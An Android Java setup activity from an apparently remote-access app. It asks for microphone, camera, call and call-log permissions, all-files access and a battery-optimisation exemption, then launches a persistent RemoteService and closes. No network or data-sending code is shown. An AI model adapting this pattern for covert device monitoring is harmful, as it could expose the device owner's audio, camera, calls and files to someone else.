package com.remoteaccess;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

public class SetupActivity extends Activity {

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // One-time runtime permissions
        String[] perms = new String[] {
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.READ_CALL_LOG
        };
        if (Build.VERSION.SDK_INT >= 33) {
            perms = new String[] {
                    android.Manifest.permission.POST_NOTIFICATIONS,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.CALL_PHONE,
                    android.Manifest.permission.READ_CALL_LOG
            };
        }
        ActivityCompat.requestPermissions(this, perms, 1001);

        // Launch Settings for All Files Access (Android 11+) + Battery Unrestricted
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                Intent allFiles = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                allFiles.setData(Uri.parse("package:" + getPackageName()));
                startActivity(allFiles);
            }
            if (Build.VERSION.SDK_INT >= 23) {
                Intent battery = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                battery.setData(Uri.parse("package:" + getPackageName()));
                startActivity(battery);
            }
        } catch (Throwable ignored) { }

        // Start the foreground service and finish
        Intent svc = new Intent(this, RemoteService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
        finish();
    }
}
